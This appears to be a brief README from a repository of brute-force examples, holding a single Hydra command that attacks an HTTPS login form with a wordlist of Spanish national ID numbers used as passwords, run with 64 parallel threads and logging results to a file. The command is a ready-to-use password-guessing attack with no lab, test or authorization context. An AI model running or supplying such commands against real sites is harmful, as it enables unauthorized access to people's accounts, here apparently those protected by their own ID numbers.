# rp-brute-force
## Hydra examples
### HTTPS POST form
Using Spanish ID as a password.
```bash
hydra -l username -P spanish-id-starts-from-78M.lst domain.com -s 443 -S https-post-form "/path/to/url:user=^USER^&pwd=^PASS^:F=302" -vV -o hydra-output.txt -t 64 -I
```
